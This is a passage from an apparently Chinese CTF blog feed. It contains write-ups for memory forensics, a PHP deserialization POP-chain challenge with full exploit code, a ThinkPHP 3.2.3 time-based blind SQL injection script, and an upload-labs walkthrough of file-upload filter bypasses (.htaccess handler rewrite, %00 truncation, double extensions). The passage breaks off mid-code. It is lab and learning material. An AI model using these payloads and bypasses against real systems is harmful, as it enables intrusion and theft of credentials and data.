–profile=&lt;配置文件&gt; &lt;插件&gt; [插件参数]</span><br></pre></td></tr></table></figure><p>使用imageinfo插件来猜测dump文件的profile值，<code>volatility -f memory imageinfo</code>，得到profile值为<code>WinXPSP2x86</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kYFHdx.png" alt="kYFHdx.png"></p><p>直接hashdump，毕竟在Windows系统下面，但常规还是得查注册表位置，找到system和sam key的起始位置<code>hivelist -f memory -profile=WinXPSP2x86</code>，这里就不演示了，直接hashdump了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f memory --profile=WinXPSP2x86 hashdump</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/05/kYkZlQ.png" alt="kYkZlQ.png"></p><p>获得密码<code>c22b315c040ae6e0efee3518d830362b</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kYkumn.png" alt="kYkumn.png"></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h4><p>上来就一个源码，但看到<code>unserialize</code>应该就是往反序列化那个方向思考。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里涉及到一个叫pop链的构造问题，下面这篇文章就讲的很详细了<code>https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html</code>，简单来说就是当关键的代码不在魔术方法的时候而是在一些类的普通方法里面的时候，可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。这里需要满足两个条件：</p><ol><li>关键代码不在魔术方法里</li><li>普通的方法里面必须要有相同函数名</li></ol><p>观察关键代码，发现要实现读文件的功能，得先满足下面的条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">      &#123;</span><br><span class="line">          $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">          <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">          &#123;              </span><br><span class="line">              <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>因为两个类都存在read函数这个时候就很可以先构造pop链，因为skyobj是个protected类型的变量，只能使用对象注入了，这样无论是private还是public都可以控制，但是aaa的值会变化，所以需要使用引用使bbb动态跟着aaa。先构造amazing</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing;</span><br><span class="line"></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line">$a-&gt;bbb =&amp;$a-&gt;aaa;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>;</span><br></pre></td></tr></table></figure><p>最终的exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;    </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'./flag.php'</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>; </span><br><span class="line">&#125;   </span><br><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/06/kYRMtg.png" alt="kYRMtg.png"></p><h4 id="Simple-PHP"><a href="#Simple-PHP" class="headerlink" title="Simple PHP"></a>Simple PHP</h4><p>感觉题目玩坏了。。。。</p><p>反正看了看一叶飘零大佬的题解，考的是一个SQL约束攻击，以及一个tp3.2的一个注入，看起来是个报错注入，还是很有意思的一个题目。自己把源码下下来自己复现一下23333，他这个代码里面关键是有一个options变量是可控的，这修复的方案也是不再引用外部的可控变量</p><p>源码下载:<a href="http://www.thinkphp.cn/download/610.html" target="_blank" rel="noopener">http://www.thinkphp.cn/download/610.html</a></p><p>下面是自己搭建该环境(phpstudy)的测试过程</p><p><img src="https://s2.ax1x.com/2019/02/06/kYT2ff.png" alt="kYT2ff.png"></p><p><img src="https://s2.ax1x.com/2019/02/06/kYI7uj.png" alt="kYI7uj.png"></p><p><img src="https://s2.ax1x.com/2019/02/06/kYI58S.png" alt="kYI58S.png"></p><p>再尝试一下飘零大哥的方法,利用了一个时间盲注的方法，tql(破音)~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">45</span>,<span class="number">127</span>):</span><br><span class="line">url = <span class="string">'http://127.0.0.1/thinkphp3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1 and if((ascii(substr((select pass from user limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(j)+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.get(url=url,timeout=<span class="number">2.5</span>)</span><br><span class="line"><span class="keyword">print</span> url</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag += chr(j)</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>同样也能跑出结果</p><p><img src="https://s2.ax1x.com/2019/02/06/kYTbt0.png" alt="kYTbt0.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个月的安恒月赛好像很有意思
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs记录</title>
    <link href="0verwatch.top/upload-labs-wp.html"/>
    <id>0verwatch.top/upload-labs-wp.html</id>
    <published>2019-02-03T08:55:03.000Z</published>
    <updated>2019-02-13T13:53:17.703Z</updated>
    
    <content type="html"><![CDATA[<p>闲来无聊，把upload-labs所有的关卡都刷一遍<a id="more"></a>，就当复习一下文件上传漏洞的各种绕过技巧吧，做完一关再看看源代码提高一下审计能力挺好的</p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>一个前端检测，可以禁用js，也可以直接抓包就可以绕过上传</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ9HYQ.png" alt="kJ9HYQ.png"></p><p>访问成功</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ9zwT.png" alt="kJ9zwT.png"></p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>Content-Type绕过，直接把Content-Type改为图片类型即可</p><p><img src="https://s2.ax1x.com/2019/02/04/kJCA61.png" alt="kJCA61.png"></p><p>上传成功</p><p><img src="https://s2.ax1x.com/2019/02/04/kJCmTO.png" alt="kJCmTO.png"></p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>这一关是另类的文件名的绕过，可以尝试phtml，php3，php4, php5, pht后缀名都可以绕过，但是前提是要在配置文件里面有这样的一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJCIj1.png" alt="kJCIj1.png"></p><p>成功回显</p><p><img src="https://s2.ax1x.com/2019/02/04/kJC7B6.png" alt="kJC7B6.png"></p><p>源码里面直接用的黑名单。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br></pre></td></tr></table></figure><p>当然还有第二种方法</p><p>就是上传<code>.htaccess</code>，实现重写文件解析,同样这样的前提也是得在配置文件里面有这样的一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>上面的方法已经不行了，可以看一下他过滤的名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br></pre></td></tr></table></figure><p>比刚才的黑名单多了不少，但是<code>.htaccess</code>还是没有过滤，可以重写文件解析规则绕过，上传一个<code>.htaccess</code>，文件内容如下，就是在upload目录下匹配gg.jpg的文件并以php文件执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;gg.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJPput.png" alt="kJPput.png"></p><p>然后再上传一个名字为gg.jpg的脚本</p><p><img src="https://s2.ax1x.com/2019/02/04/kJVbM4.png" alt="kJVbM4.png"></p><p>然后访问成功执行</p><p><img src="https://s2.ax1x.com/2019/02/04/kJZgfK.png" alt="kJZgfK.png"></p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>这一题里面多过滤了<code>.htaccess</code>，如何绕过呢？</p><p><img src="https://s2.ax1x.com/2019/02/04/kJmaqJ.png" alt="kJmaqJ.png"></p><p>对比一下代码可以知道，可以使用大小写绕过，因为这里把原来转换成小写的那一部分给删掉了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJmBI1.png" alt="kJmBI1.png"></p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>这一关比第五关少了这样的一句代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>所以可以后缀名+空格的形式去绕过</p><p><img src="https://s2.ax1x.com/2019/02/04/kJnO1K.png" alt="kJnO1K.png"></p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>对比第6题的代码可以发现少了下面一句代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure><p>既然没有对文件最后的点做过滤，可以尝试以后缀名加上点的形式去绕过</p><p><img src="https://s2.ax1x.com/2019/02/04/kJKZ26.png" alt="kJKZ26.png"></p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>这一题的代码比上一次少了下面这一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>这个是关于windows下文件的流特性，可以参考一下这篇文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream</span><br></pre></td></tr></table></figure><p>这样一来就是说这东西应该只能在Windows下运行了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ1FOK.png" alt="kJ1FOK.png"></p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>这一关像是前几关的组合拳，虽然把最后的点给删掉，但是仍然可以绕过，因为这里的过滤并没有递归下去，只是一步，这样就相当于SQL注入里面用str_replace只过滤一次关键字一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>可以遵循着他的步骤去实现自己的payload，可以这样设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.php. .</span><br></pre></td></tr></table></figure><p>这样一来检测到最后的文件名是<code>4.php.</code>这样就相当于第七关了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ1zB8.png" alt="kJ1zB8.png"></p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>关键过滤的代码就这两句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">   $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br></pre></td></tr></table></figure><p>跟我上一关讲的SQL注入的类型差不多，就是双写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.pphphp</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJ3yKP.png" alt="kJ3yKP.png"></p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>关键的代码在于这里的’save_path’是一个可控的变量，但是后面还拼接上一个后缀名，也需要绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p>这个时候可以使用%00截断，但这东西有点过气了，因为需要两个条件</p><ol><li>php版本小于5.3.4</li><li>php的magic_quotes_gpc为OFF状态</li></ol><p>如果要完成这一个题目就必须要实现上面的两个条件，但是现在都PHP7了，这东西也就很少见了，满足上面的条件的时候php就是把它当成结束符，后面的数据直接忽略，这也导致了很多的问题，文件包含也可以利用这一点</p><p>所以如果要绕过，我们可以这样去实现，另save_path等于下面的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../upload/4.php%00</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcCUH.png" alt="kJcCUH.png"></p><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>这里的源代码就改了一点点，就是把get改为post类型，一样的方式绕过，只不过这里需要在二进制里面修改%00，因为post不会像get对%00进行自动解码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span 